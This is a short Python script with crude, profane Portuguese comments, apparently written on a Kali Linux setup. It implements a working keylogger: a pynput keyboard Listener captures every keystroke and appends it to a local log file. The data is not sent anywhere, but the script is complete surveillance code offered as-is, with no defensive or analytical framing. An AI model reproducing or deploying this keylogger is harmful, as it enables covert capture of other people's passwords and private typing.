#em pynput, importar o método Listener do teclado
import os
from pynput.keyboard import Listener

os.system('cls' if os.name == 'nt' else 'clear')

#defina a localização do arquivo de log
logFile = "/home/kali/penis.txt"

def writeLog(key):
    '''
    Essa função será responsável por receber  a merda da tecla pressionada blz?
    Ai tu me percunta a que nao sei oq que nao sei o que  mas como ela vai ser recebida?? 
    Ela sera recebida via Listener e escrever na porra do arquivo de log compreende??
    '''

    #converter a tecla pressionada para a string
    keydata = str(key)

    #abrir o negocio do  arquivo de log no modo append
    with open(logFile, "a") as f:
        f.write(keydata)

#abrir o Listener do teclado e escutar o evento com o on_press
#quando o evento on_press ocorrer, chamar a função writeLog
with Listener(on_press=writeLog) as l:
    l.join()
